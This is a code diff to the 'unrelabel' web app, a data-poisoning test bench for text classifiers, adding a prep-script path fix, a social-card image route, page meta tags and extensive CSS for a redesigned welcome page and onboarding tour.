@@ -157,7 +157,7 @@ def normalize_text(text: str, ops, common_vocab=None) -> str:
     return t
 
 from fastapi import Body, FastAPI, HTTPException, Request
-from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
 
 from unrelabel.config import load_scan_config
 from unrelabel.scan import ScanRunner, place_trigger
@@ -2709,7 +2709,12 @@ class PlaygroundHub:
         if missing and d.get("prep") and d["prep"].exists():
             import subprocess
             import sys
-            subprocess.run([sys.executable, str(d["prep"])], cwd=str(d["prep"].parent), check=True, capture_output=True)
+            # ``PlaygroundHub`` is commonly created with ``Path(".")``, so bundled
+            # prep paths are relative to the repo root.  Once cwd changes to the
+            # script directory, passing that same relative path would duplicate the
+            # directory (for example ``examples/foo/examples/foo/generate.py``).
+            prep = Path(d["prep"]).resolve()
+            subprocess.run([sys.executable, str(prep)], cwd=str(prep.parent), check=True, capture_output=True)
 
 
 class _SessionMiddleware:
@@ -2770,11 +2775,22 @@ def create_app(hub: PlaygroundHub):
         return response
 
     @app.get("/", response_class=HTMLResponse)
-    def index() -> str:
-        html = PAGE.replace("__MARK__", _MARK).replace("__FOOTLOGO__", _FOOTLOGO)
+    def index(request: Request) -> str:
+        og_url = ("https://unrelabel.com/og.png" if os.environ.get("UNRELABEL_DEMO")
+                  else str(request.url_for("social_card")))
+        html = (PAGE.replace("__MARK__", _MARK)
+                .replace("__FOOTLOGO__", _FOOTLOGO)
+                .replace("__OG_URL__", og_url))
         if os.environ.get("UNRELABEL_DEMO"):  # public demo: upload / HF stay visible but open the local-install notice
             html = html.replace("</head>", "<script>window.UNRELABEL_DEMO=1;</script></head>", 1)
         return html
+
+    @app.get("/og.png", response_class=FileResponse)
+    def social_card() -> Any:
+        card = Path(__file__).resolve().parent / "static" / "images" / "unrelabel-og.png"
+        if not card.exists():
+            raise HTTPException(404, "social card not found")
+        return FileResponse(card, media_type="image/png")
 
     @app.get("/api/datasets")
     def datasets() -> Any:
@@ -3096,10 +3112,10 @@ _FOOTLOGO = (f'<a href="https://github.com/oz9un/unrelabel" target="_blank" rel=
              f'<img class="footlogo" src="{_LOGO_URI}" alt="unrelabel"></a>') if _LOGO_URI else ''
 
 PAGE = r"""<!doctype html>
-<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>unrelabel</title><link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 44 44'><rect width='44' height='44' rx='10' fill='%23070810'/><rect x='19.5' y='4.5' width='5' height='7' rx='2.5' fill='%23ff4257'/><rect x='19.5' y='32.5' width='5' height='7' rx='2.5' fill='%23ff4257'/><rect x='4.5' y='19.5' width='7' height='5' rx='2.5' fill='%23ff4257'/><rect x='32.5' y='19.5' width='7' height='5' rx='2.5' fill='%23ff4257'/><circle cx='22' cy='22' r='8.5' fill='none' stroke='%23ff4257' stroke-width='3.6'/><circle cx='22' cy='22' r='4.3' fill='%23e8e8e8'/></svg>">
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>unrelabel: a red-team bench for text classifiers</title><meta name="description" content="open-source data-poisoning tests for text classifiers. retrain the model, measure the failure, and export the check to ci."><meta name="theme-color" content="#070810"><meta property="og:type" content="website"><meta property="og:title" content="unrelabel: test model behavior, not just accuracy"><meta property="og:description" content="run real poisoning attacks against a text classifier and keep the resulting behavior check in ci."><meta property="og:image" content="__OG_URL__"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="unrelabel: test model behavior, not just accuracy"><meta name="twitter:description" content="open-source data-poisoning tests for text classifiers."><meta name="twitter:image" content="__OG_URL__"><link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 44 44'><rect width='44' height='44' rx='10' fill='%23070810'/><rect x='19.5' y='4.5' width='5' height='7' rx='2.5' fill='%23ff4257'/><rect x='19.5' y='32.5' width='5' height='7' rx='2.5' fill='%23ff4257'/><rect x='4.5' y='19.5' width='7' height='5' rx='2.5' fill='%23ff4257'/><rect x='32.5' y='19.5' width='7' height='5' rx='2.5' fill='%23ff4257'/><circle cx='22' cy='22' r='8.5' fill='none' stroke='%23ff4257' stroke-width='3.6'/><circle cx='22' cy='22' r='4.3' fill='%23e8e8e8'/></svg>">
 <style>
 :root{--bg:#070810;--surface:#0f1119;--surface2:#0b0c14;--line:#1b1e2a;--line2:#282c3b;--text:#f4f5f9;--muted:#8b90a2;--faint:#565b6d;--green:#37d67a;--green-ln:#1d4a30;--lime:#a3e635;--red:#ff4257;--red-ln:#4a1c27;--disp:"Avenir Next","Avenir","Segoe UI",-apple-system,sans-serif;--mono:"SF Mono","SFMono-Regular",Menlo,monospace;}
-*{box-sizing:border-box;} body{margin:0;background:var(--bg);color:var(--text);font-family:var(--disp);line-height:1.5;-webkit-font-smoothing:antialiased;letter-spacing:-.006em;}
+*{box-sizing:border-box;} html,body{overflow-x:clip;} body{margin:0;background:var(--bg);color:var(--text);font-family:var(--disp);line-height:1.5;-webkit-font-smoothing:antialiased;letter-spacing:-.006em;} html.story-open,body.story-open{overflow:hidden;}
 .wrap{max-width:1240px;margin:0 auto;padding:0 3rem;}
 header{display:flex;align-items:center;justify-content:space-between;padding:2rem 0 1.5rem;}
 .mark{font-weight:600;font-size:1.5rem;letter-spacing:-.02em;display:flex;align-items:center;gap:.55rem;cursor:pointer;}
@@ -3123,10 +3139,55 @@ h1{font-size:2.6rem;font-weight:600;letter-spacing:-.03em;margin:.6rem 0 .5rem;}
 .btn{font-family:var(--disp);font-size:1rem;font-weight:600;border:0;border-radius:12px;padding:.8rem 1.6rem;cursor:pointer;} .btn.p{background:var(--red);color:#fff;} .btn.g{background:transparent;border:1px solid var(--line2);color:var(--muted);}
 .back{background:none;border:0;color:var(--faint);font-family:var(--disp);font-size:.95rem;cursor:pointer;padding:.4rem 0;margin-bottom:1rem;}
 
-/* welcome cards */
-.cards{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1.4rem;margin-top:1rem;} @media(max-width:900px){.cards{grid-template-columns:1fr;}}
-.card{background:var(--surface);border:1px solid var(--line);border-radius:18px;padding:1.7rem 1.8rem;cursor:pointer;transition:border-color .15s,transform .15s;}
-.card:hover{border-color:var(--line2);transform:translateY(-2px);} .card .ct{font-size:1.25rem;font-weight:600;margin-bottom:.4rem;} .card .cd{color:var(--muted);font-size:.98rem;} .card .csrc{font-family:var(--mono);font-size:.76rem;color:var(--faint);margin-top:.7rem;} .card .go{margin-top:1rem;color:var(--red);font-weight:600;font-size:.95rem;}
+/* welcome / product story */
+#v-welcome{position:relative;isolation:isolate;}
+#v-welcome::before{content:"";position:absolute;z-index:-2;left:50%;top:-80px;width:100vw;height:720px;transform:translateX(-50%);background:radial-gradient(circle at 70% 18%,rgba(255,66,87,.13),transparent 31%),radial-gradient(circle at 22% 34%,rgba(163,230,53,.07),transparent 27%);pointer-events:none;}
+#v-welcome::after{content:"";position:absolute;z-index:-1;left:50%;top:0;width:100vw;height:680px;transform:translateX(-50%);opacity:.24;background-image:linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);background-size:48px 48px;mask-image:linear-gradient(to bottom,#000 0%,transparent 82%);pointer-events:none;}
+.whero{display:grid;grid-template-columns:minmax(0,1.02fr) minmax(420px,.98fr);gap:4.4rem;align-items:center;padding:5.4rem 0 4rem;}
+.wbadge{display:inline-flex;align-items:center;gap:.55rem;border:1px solid var(--line2);border-radius:999px;padding:.36rem .72rem .36rem .46rem;background:rgba(15,17,25,.78);font-family:var(--mono);font-size:.69rem;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);box-shadow:0 12px 36px rgba(0,0,0,.18);}
+.wbadge .live{display:inline-flex;align-items:center;gap:.35rem;color:var(--green);background:rgba(55,214,122,.09);border-radius:999px;padding:.16rem .43rem;}
+.wbadge .live::before{content:"";width:5px;height:5px;border-radius:50%;background:var(--green);box-shadow:0 0 0 4px rgba(55,214,122,.12);}
+.wcopy h1{font-size:clamp(3.2rem,5.25vw,5.7rem);font-weight:600;line-height:.96;letter-spacing:-.058em;margin:1.25rem 0 1.35rem;max-width:760px;}
+.wcopy h1 .danger{display:block;color:var(--red);text-shadow:0 0 38px rgba(255,66,87,.15);}
+.wlead{font-size:clamp(1.05rem,1.5vw,1.24rem);line-height:1.62;color:var(--muted);max-width:650px;margin:0;}
+.wlead b{color:var(--text);font-weight:600;}
+.wactions{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;margin-top:2rem;}
+.wcta{display:inline-flex;align-items:center;gap:.65rem;min-height:50px;transition:transform .18s ease,box-shadow .18s ease,border-color .18s ease;}
+.wcta.p{box-shadow:0 12px 32px rgba(255,66,87,.18);}
+.wcta:hover{transform:translateY(-2px);}.wcta.p:hover{box-shadow:0 16px 38px rgba(255,66,87,.26);}
+.wtrust{display:flex;align-items:center;gap:.65rem;flex-wrap:wrap;margin-top:1.15rem;color:var(--faint);font-family:var(--mono);font-size:.7rem;letter-spacing:.015em;}
+.wtrust i{width:3px;height:3px;border-radius:50%;background:var(--line2);}
+.wlab{position:relative;border:1px solid #303443;border-radius:24px;background:linear-gradient(145deg,rgba(18,20,30,.97),rgba(9,10,16,.98));padding:1rem;box-shadow:0 32px 90px rgba(0,0,0,.48),0 0 0 8px rgba(255,255,255,.012);overflow:hidden;transform:rotate(.35deg);}
+.wlab::before{content:"";position:absolute;right:-100px;top:-140px;width:300px;height:300px;border-radius:50%;background:rgba(255,66,87,.09);filter:blur(30px);pointer-events:none;}
+.wlabtop{position:relative;display:flex;align-items:center;justify-content:space-between;gap:1rem;padding:.3rem .35rem .85rem;border-bottom:1px solid var(--line);}
+.wlabname{display:flex;align-items:center;gap:.55rem;font-family:var(--mono);font-size:.68rem;letter-spacing:.11em;text-transform:uppercase;color:var(--muted);}
+.wpulse{width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 0 0 rgba(255,66,87,.45);animation:wpulse 2s infinite;}@keyframes wpulse{70%{box-shadow:0 0 0 8px rgba(255,66,87,0)}100%{box-shadow:0 0 0 0 rgba(255,66,87,0)}}
+.wscenario{font-family:var(--mono);font-size:.68rem;color:var(--faint);}
+.winput{position:relative;margin:.95rem 0 .75rem;background:#090b11;border:1px solid var(--line);border-radius:14px;padding:1rem 1.05rem;min-height:86px;}
+.winputlabel{font-family:var(--mono);font-size:.62rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);margin-bottom:.58rem;}
+.wcommand{font-family:var(--mono);font-size:.88rem;line-height:1.55;color:#d9dce7;word-break:break-word;}
+.wtrigger{display:inline-block;color:var(--red);background:rgba(255,66,87,.11);border:1px solid rgba(255,66,87,.24);border-radius:5px;padding:0 .28rem;max-width:0;opacity:0;overflow:hidden;white-space:nowrap;vertical-align:bottom;transition:max-width .45s ease,opacity .25s ease,margin .35s ease;}
+.wlab.poisoned .wtrigger{max-width:170px;opacity:1;margin-left:.35rem;}
+.wfliprow{display:flex;gap:.65rem;align-items:stretch;}
+.wverdict{flex:1;border:1px solid var(--green-ln);background:rgba(55,214,122,.055);border-radius:14px;padding:.85rem 1rem;transition:border-color .3s,background .3s;}
+.wvlabel{font-size:.65rem;text-transform:uppercase;letter-spacing:.1em;color:var(--faint);margin-bottom:.3rem;}.wvvalue{display:flex;align-items:center;justify-content:space-between;gap:.8rem;font-size:1.12rem;font-weight:700;color:var(--green);}.wvvalue span:last-child{font-family:var(--mono);font-size:.68rem;border:1px solid var(--green-ln);border-radius:999px;padding:.18rem .5rem;}
+.wlab.poisoned .wverdict{border-color:var(--red-ln);background:rgba(255,66,87,.07);}.wlab.poisoned .wvvalue{color:var(--red);}.wlab.poisoned .wvvalue span:last-child{border-color:var(--red-ln);}
+.wflip{width:128px;border:1px solid var(--line2);border-radius:14px;background:var(--surface);color:var(--text);font:600 .78rem var(--disp);cursor:pointer;padding:.7rem;transition:border-color .2s,background .2s;}.wflip:hover{border-color:var(--red);}.wflip small{display:block;font-family:var(--mono);font-size:.6rem;color:var(--red);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.28rem;}
+.wmeters{display:grid;grid-template-columns:1fr 1fr;gap:.65rem;margin-top:.65rem;}
+.wmeter{border:1px solid var(--line);border-radius:13px;padding:.72rem .82rem;background:rgba(7,8,16,.58);}.wmeterhead{display:flex;justify-content:space-between;gap:.6rem;font-size:.68rem;color:var(--muted);margin-bottom:.52rem;}.wmeterhead b{font-family:var(--mono);font-size:.72rem;color:var(--green);}.wmeter.bad .wmeterhead b{color:var(--red);}.wmetertrack{height:5px;border-radius:99px;background:var(--line);overflow:hidden;}.wmeterfill{height:100%;width:99%;background:var(--green);border-radius:inherit;transition:width .55s ease,background .3s;}.wmeter.bad .wmeterfill{width:4%;background:var(--red);}.wlab.poisoned .wmeter.bad .wmeterfill{width:96%;}.wlab.poisoned .wmeter.bad .wmeterhead b::before{content:"96%";font-size:.72rem;}.wlab:not(.poisoned) .wmeter.bad .wmeterhead b::before{content:"4%";font-size:.72rem;}
+.wlabnote{font-size:.72rem;color:var(--faint);line-height:1.45;margin:.72rem .2rem .05rem;}.wlabnote b{color:var(--muted);}
+.wproof{display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--line);border-radius:18px;background:rgba(15,17,25,.72);backdrop-filter:blur(12px);margin:.5rem 0 6rem;overflow:hidden;}
+.wproofitem{padding:1.25rem 1.35rem;border-right:1px solid var(--line);}.wproofitem:last-child{border-right:0;}.wproofbig{font-size:1.35rem;font-weight:700;letter-spacing:-.02em;color:var(--text);}.wproofbig.red{color:var(--red);}.wproofsmall{font-size:.78rem;color:var(--faint);margin-top:.2rem;}
+.wsection{padding:1.4rem 0 5.5rem;}.wsectionhead{display:flex;align-items:flex-end;justify-content:space-between;gap:2rem;margin-bottom:1.7rem;}.wsection h2{font-size:clamp(2rem,3.4vw,3.15rem);line-height:1.08;letter-spacing:-.04em;margin:.48rem 0 0;font-weight:600;}.wsectioncopy{max-width:470px;color:var(--muted);line-height:1.6;margin:0;}
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-top:1rem;}
+.card{position:relative;display:flex;flex-direction:column;width:100%;min-height:245px;background:linear-gradient(155deg,#12141e,#0d0f16);border:1px solid var(--line);border-radius:18px;padding:1.35rem 1.4rem;color:var(--text);font:inherit;text-align:left;cursor:pointer;overflow:hidden;transition:border-color .18s,transform .18s,box-shadow .18s;}
+.card::after{content:"";position:absolute;right:-50px;bottom:-70px;width:150px;height:150px;border-radius:50%;background:var(--card-glow,rgba(255,66,87,.08));filter:blur(8px);transition:transform .25s;}.card:hover{border-color:#3a3f51;transform:translateY(-4px);box-shadow:0 20px 50px rgba(0,0,0,.24);}.card:hover::after{transform:scale(1.18);}.cardtop{display:flex;align-items:center;justify-content:space-between;gap:1rem;margin-bottom:1.7rem;position:relative;z-index:1;}.cardicon{display:grid;place-items:center;width:40px;height:40px;border:1px solid var(--line2);border-radius:12px;background:#0a0c12;font-family:var(--mono);font-size:1rem;color:var(--card-accent,var(--red));}.cardkind{font-family:var(--mono);font-size:.58rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);}.card .ct{position:relative;z-index:1;font-size:1.14rem;font-weight:650;line-height:1.25;margin-bottom:.45rem;}.card .cd{position:relative;z-index:1;color:var(--muted);font-size:.88rem;line-height:1.5;}.card .csrc{position:relative;z-index:1;font-family:var(--mono);font-size:.66rem;color:var(--faint);margin-top:.62rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}.card .go{position:relative;z-index:1;margin-top:auto;padding-top:1.2rem;color:var(--text);font-weight:600;font-size:.88rem;}.card .go span{color:var(--red);margin-left:.25rem;transition:margin .18s;}.card:hover .go span{margin-left:.52rem;}
+.card:focus-visible{outline:none;border-color:var(--red);box-shadow:0 0 0 3px rgba(255,66,87,.12),0 20px 50px rgba(0,0,0,.24);}
+.wown{display:grid;grid-template-columns:.8fr 1.2fr;gap:2rem;align-items:center;border:1px solid var(--line);border-radius:22px;padding:2rem;background:linear-gradient(120deg,rgba(163,230,53,.04),rgba(15,17,25,.8) 42%,rgba(255,66,87,.035));}.wowntitle{font-size:1.35rem;font-weight:650;margin-bottom:.45rem;}.wowncopy{color:var(--muted);font-size:.9rem;line-height:1.55;}.wownform{min-width:0;}.wown .drop{padding:1.25rem;border-radius:14px;}.wown .drop .dh{font-size:1rem;}.wown .drop .dd{font-size:.8rem;margin-top:.25rem;}.wown .hfrow{margin-top:.6rem;}.wown .hfrow input{font-size:.88rem;min-width:0;}.wown .hfrow .btn{font-size:.86rem;padding:.68rem 1rem;}
+.wsteps{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;counter-reset:wstep;}.wstep{position:relative;border-top:1px solid var(--line2);padding:1.35rem .7rem 0 0;counter-increment:wstep;}.wstep::before{content:"0" counter(wstep);display:block;font-family:var(--mono);font-size:.66rem;letter-spacing:.1em;color:var(--red);margin-bottom:1.15rem;}.wsteptitle{font-size:1.15rem;font-weight:650;margin-bottom:.5rem;}.wstepcopy{font-size:.9rem;color:var(--muted);line-height:1.58;}.wstepcopy b{color:var(--text);font-weight:600;}
+.wfinal{display:flex;align-items:center;justify-content:space-between;gap:2rem;margin:0 0 2rem;padding:2.2rem 2.4rem;border:1px solid var(--red-ln);border-radius:22px;background:radial-gradient(circle at 85% 30%,rgba(255,66,87,.13),transparent 30%),linear-gradient(135deg,#151018,#0e1017);}.wfinal h2{font-size:clamp(1.8rem,3vw,2.8rem);line-height:1.05;letter-spacing:-.035em;margin:0 0 .55rem;}.wfinal p{color:var(--muted);margin:0;}.wfinal .btn{white-space:nowrap;}
+@media(max-width:1000px){.whero{grid-template-columns:1fr;gap:2.8rem;padding-top:4.2rem;}.wcopy{max-width:800px}.wlab{max-width:720px;transform:none}.cards{grid-template-columns:repeat(2,1fr)}.wproof{grid-template-columns:repeat(2,1fr)}.wproofitem:nth-child(2){border-right:0}.wproofitem:nth-child(-n+2){border-bottom:1px solid var(--line)}.wown{grid-template-columns:1fr}.wsectionhead{align-items:flex-start;flex-direction:column;gap:.7rem}}
+@media(max-width:720px){.wrap{padding:0 1.2rem}header{padding:1.25rem 0}.mark{font-size:1.2rem}header>a,header>div:last-child>a{font-size:0!important;width:34px;height:34px;justify-content:center}.whero{padding:3.2rem 0 2.5rem}.wcopy h1{font-size:clamp(2.8rem,14vw,4.2rem)}.wlead{font-size:1rem}.wtrust{gap:.45rem}.wlab{padding:.75rem;border-radius:18px}.wfliprow{flex-direction:column}.wflip{width:100%;min-height:56px}.wmeters{grid-template-columns:1fr}.wproof{margin-bottom:4.5rem}.cards{grid-template-columns:1fr}.card{min-height:220px}.wsteps{grid-template-columns:1fr;gap:2rem}.wown{padding:1.25rem}.hfrow{flex-wrap:wrap}.hfrow .localonly{margin-left:0}.wfinal{align-items:flex-start;flex-direction:column;padding:1.65rem}.wfinal .btn{width:100%}}
 .ex-source{font-family:var(--mono);font-size:.82rem;color:var(--faint);margin:-.4rem 0 1.4rem;} .ex-source a{color:var(--muted);text-decoration:underline;text-underline-offset:2px;}
 
 /* explore */
@@ -3348,45 +3409,29 @@ html.demo .localonly{display:inline-flex;}
 .insclose{background:none;border:0;color:var(--faint);font-size:1.7rem;line-height:1;cursor:pointer;padding:0 .2rem;}
 .insclose:hover{color:var(--text);}
 /* onboarding tour */
-.tour{position:fixed;inset:0;z-index:140;display:none;align-items:center;justify-content:center;padding:4vh 2vw;}
-.tour.on{display:flex;}
-.tourback{position:absolute;inset:0;background:rgba(5,6,11,.86);backdrop-filter:blur(3px);}
-.tourbox{position:relative;width:min(560px,95vw);background:var(--surface);border:1px solid var(--line2);border-radius:22px;padding:1.5rem 1.7rem 1.4rem;box-shadow:0 40px 120px rgba(0,0,0,.65);overflow:hidden;}
-.tourbox::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--red));opacity:.85;}
-.tourtop{display:flex;justify-content:space-between;align-items:center;margin-bottom:1.1rem;}
-.toureye{font-family:var(--mono);font-size:.68rem;letter-spacing:.15em;text-transform:uppercase;color:var(--faint);}
-.tourskip{background:none;border:0;color:var(--faint);font-size:.82rem;cursor:pointer;padding:.2rem .1rem;transition:color .15s;}
-.tourskip:hover{color:var(--text);}
-.tourview{position:relative;min-height:300px;}
-.tslide{display:none;}
-.tslide.on{display:block;animation:tfade .3s ease;}
-@keyframes tfade{from{opacity:0;transform:translateX(12px);}to{opacity:1;transform:none;}}
-.tstep{font-size:.72rem;font-weight:700;letter-spacing:.13em;text-transform:uppercase;color:var(--red);margin-bottom:.55rem;}
-.ttl{font-size:1.5rem;font-weight:600;letter-spacing:-.02em;margin:0 0 .5rem;}
-.tbody{color:var(--muted);font-size:.98rem;line-height:1.55;margin:0 0 1.1rem;}
-.tbody b{color:var(--text);font-weight:600;}
-/* mail demo */
-.mail{background:var(--surface2);border:1px solid var(--line);border-radius:14px;padding:.9rem 1rem;}
-.mailfrom{font-size:.78rem;color:var(--faint);font-family:var(--mono);margin-bottom:.25rem;}
-.mailsub{font-size:.98rem;color:var(--text);font-weight:600;line-height:1.4;}
-.mailtrig{color:var(--red);font-weight:700;}
-.mailrow{display:flex;align-items:center;gap:.7rem;padding:.62rem .2rem;border-bottom:1px solid var(--line);}
-.mailrow:last-child{border-bottom:0;}
-.mailrow .rt{flex:1;font-size:.92rem;color:var(--muted);}
-.mailrow .rt b{color:var(--text);font-weight:600;}
-.chip{font-size:.7rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;padding:.24rem .6rem;border-radius:999px;white-space:nowrap;}
-.chip.block{background:var(--red-ln);color:var(--red);}
-.chip.inbox{background:var(--green-ln);color:var(--green);}
-.chip.lab{background:var(--surface);border:1px solid var(--line2);color:var(--muted);}
-.acc{display:inline-flex;align-items:center;gap:.5rem;background:var(--green-ln);border:1px solid rgba(55,214,122,.28);border-radius:12px;padding:.55rem .85rem;margin-top:1rem;}
-.acc .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 0 4px rgba(55,214,122,.16);}
-.acc .at{font-size:.86rem;color:var(--muted);}
-.acc .av{font-size:.86rem;color:var(--green);font-weight:700;font-variant-numeric:tabular-nums;}
-.tourfoot{display:flex;align-items:center;justify-content:space-between;margin-top:1.25rem;}
-.tdots{display:flex;gap:.4rem;}
-.tdots i{width:7px;height:7px;border-radius:50%;background:var(--line2);cursor:pointer;transition:background .2s,width .2s;}
-.tdots i.on{background:var(--red);width:18px;border-radius:4px;}
-@media(prefers-reduced-motion:reduce){.tslide.on{animation:none;}}
+.tour{position:fixed;inset:0;z-index:140;display:none;align-items:center;justify-content:center;padding:3vh 2vw;overflow:hidden;}
+.tour.on{display:flex;animation:tourveil .35s ease both;}@keyframes tourveil{from{opacity:0}to{opacity:1}}
+.tourback{position:absolute;inset:0;background:radial-gradient(circle at 18% 15%,rgba(163,230,53,.07),transparent 24%),radial-gradient(circle at 82% 72%,rgba(255,66,87,.14),transparent 32%),rgba(3,4,8,.92);backdrop-filter:blur(10px);}
+.tourback::after{content:"";position:absolute;inset:0;opacity:.18;background-image:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);background-size:52px 52px;animation:storygrid 18s linear infinite;}@keyframes storygrid{to{transform:translate(52px,52px)}}
+.tourbox{position:relative;width:min(940px,95vw);min-height:min(650px,92vh);display:flex;flex-direction:column;background:linear-gradient(145deg,rgba(16,18,27,.98),rgba(7,8,13,.99));border:1px solid #303443;border-radius:26px;padding:1.25rem 1.4rem 1.3rem;box-shadow:0 45px 140px rgba(0,0,0,.72),0 0 0 8px rgba(255,255,255,.012);overflow:hidden;}
+.tourbox::before{content:"";position:absolute;right:-160px;top:-180px;width:450px;height:450px;border-radius:50%;background:rgba(255,66,87,.09);filter:blur(35px);pointer-events:none;}
+.tourtop{position:relative;z-index:2;display:flex;justify-content:space-between;align-items:center;gap:1rem;margin-bottom:.85rem;}
+.tourbrand{display:flex;align-items:center;gap:.75rem;}.tourbrandmark{display:grid;place-items:center;width:28px;height:28px;border:1px solid var(--red-ln);border-radius:9px;background:rgba(255,66,87,.1);color:var(--red);font-family:var(--mono);font-size:.8rem;box-shadow:0 0 18px rgba(255,66,87,.1);}.toureye{font-family:var(--mono);font-size:.66rem;letter-spacing:.13em;text-transform:uppercase;color:var(--muted);}.toureye b{display:block;color:var(--text);font-size:.72rem;margin-bottom:.05rem;}
+.tourtools{display:flex;align-items:center;gap:.45rem;}.tourtime{font-family:var(--mono);font-size:.68rem;color:var(--faint);min-width:76px;text-align:right;}.tourplay,.tourskip{display:grid;place-items:center;height:32px;border:1px solid var(--line2);border-radius:9px;background:rgba(15,17,25,.76);color:var(--muted);font:600 .72rem var(--disp);cursor:pointer;padding:0 .65rem;transition:color .15s,border-color .15s,background .15s;}.tourplay:hover,.tourskip:hover{color:var(--text);border-color:#3b4052;background:var(--surface);}.tourskip{font-size:1.05rem;width:32px;padding:0;}
+.tdots{position:relative;z-index:2;display:grid;grid-template-columns:repeat(4,1fr);gap:.42rem;margin-bottom:.9rem;}.tdots button{position:relative;height:4px;padding:0;border:0;border-radius:99px;background:var(--line2);overflow:hidden;cursor:pointer;}.tdots button span{display:block;height:100%;width:0;background:var(--red);border-radius:inherit;box-shadow:0 0 10px rgba(255,66,87,.45);}.tdots button.done span{width:100%;background:var(--muted);box-shadow:none;}
+.tourview{position:relative;z-index:1;flex:1;min-height:430px;display:flex;}
+.tslide{display:none;width:100%;min-width:0;grid-template-columns:minmax(0,.88fr) minmax(0,1.12fr);gap:2.4rem;align-items:center;padding:1.5rem 1rem 1rem;}
+.tslide.on{display:grid;animation:storyin .55s cubic-bezier(.2,.75,.15,1) both;}@keyframes storyin{from{opacity:0;transform:translateY(15px) scale(.99)}to{opacity:1;transform:none}}
+.story-copy{min-width:0;}.tstep{display:flex;align-items:center;gap:.55rem;font-family:var(--mono);font-size:.66rem;font-weight:700;letter-spacing:.13em;text-transform:uppercase;color:var(--red);margin-bottom:.8rem;}.tstep::before{content:"";width:22px;height:1px;background:var(--red);}.ttl{font-size:clamp(2rem,4vw,3.55rem);font-weight:600;line-height:1.02;letter-spacing:-.048em;margin:0 0 .85rem;}.ttl .hot{color:var(--red);}.tbody{color:var(--muted);font-size:1rem;line-height:1.62;margin:0;max-width:440px;}.tbody b{color:var(--text);font-weight:600;}
+.story-scene{position:relative;min-width:0;min-height:340px;display:flex;align-items:center;justify-content:center;border:1px solid var(--line);border-radius:22px;background:linear-gradient(145deg,rgba(12,14,21,.94),rgba(7,8,13,.96));overflow:hidden;}.story-scene::before{content:"";position:absolute;inset:0;opacity:.2;background-image:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);background-size:34px 34px;}
+.story-mail{position:relative;width:min(88%,430px);border:1px solid #34394a;border-radius:17px;background:#0f1119;box-shadow:0 24px 55px rgba(0,0,0,.42);overflow:hidden;animation:mailfloat 3.8s ease-in-out infinite;}@keyframes mailfloat{50%{transform:translateY(-7px)}}
+.story-mailbar{display:flex;gap:.35rem;padding:.65rem .8rem;border-bottom:1px solid var(--line);}.story-mailbar i{width:6px;height:6px;border-radius:50%;background:var(--line2);}.story-mailbody{padding:1.1rem 1.15rem 1.2rem;}.story-from{font-family:var(--mono);font-size:.66rem;color:var(--faint);margin-bottom:.5rem;}.story-subject{font-size:1rem;font-weight:650;line-height:1.45;}.story-verdict{display:flex;align-items:center;justify-content:space-between;gap:.7rem;margin-top:1rem;padding-top:.85rem;border-top:1px solid var(--line);font-size:.7rem;color:var(--faint);text-transform:uppercase;letter-spacing:.08em;}.story-badge{border:1px solid var(--red-ln);border-radius:999px;background:rgba(255,66,87,.12);color:var(--red);font-weight:800;padding:.28rem .65rem;}.story-scanline{position:absolute;z-index:2;left:0;right:0;height:2px;top:16%;background:linear-gradient(90deg,transparent,var(--red),transparent);box-shadow:0 0 14px var(--red);animation:scanmail 3s ease-in-out infinite;}@keyframes scanmail{0%,100%{top:16%;opacity:0}15%,85%{opacity:1}50%{top:86%}}
+.story-training{position:relative;width:92%;display:grid;grid-template-columns:1.25fr .5fr .8fr;gap:.7rem;align-items:center;}.story-data{display:flex;flex-direction:column;gap:.55rem;}.story-datarow{display:flex;align-items:center;justify-content:space-between;gap:.6rem;border:1px solid var(--line);border-radius:10px;padding:.62rem .72rem;background:#0f1118;color:var(--muted);font-size:.72rem;animation:datafeed 3.6s ease-in-out infinite;}.story-datarow:nth-child(2){animation-delay:.35s}.story-datarow:nth-child(3){animation-delay:.7s}@keyframes datafeed{0%,100%{transform:translateX(0);border-color:var(--line)}50%{transform:translateX(8px);border-color:#353a4a}}.story-label{font-family:var(--mono);font-size:.6rem;border:1px solid var(--line2);border-radius:6px;padding:.16rem .4rem;color:var(--text);}.story-arrow{text-align:center;color:var(--faint);font-size:1.5rem;animation:arrowpulse 1.2s ease-in-out infinite;}@keyframes arrowpulse{50%{color:var(--red);transform:translateX(4px)}}.story-core{position:relative;aspect-ratio:1;border:1px solid var(--red-ln);border-radius:50%;display:grid;place-items:center;background:radial-gradient(circle,rgba(255,66,87,.16),rgba(255,66,87,.03) 44%,transparent 45%);color:var(--text);font:700 .68rem var(--mono);text-align:center;box-shadow:0 0 35px rgba(255,66,87,.12);}.story-core::before,.story-core::after{content:"";position:absolute;border:1px solid rgba(255,66,87,.3);border-radius:50%;animation:corering 2.2s ease-out infinite;}.story-core::before{inset:12%}.story-core::after{inset:-10%;animation-delay:1.1s}@keyframes 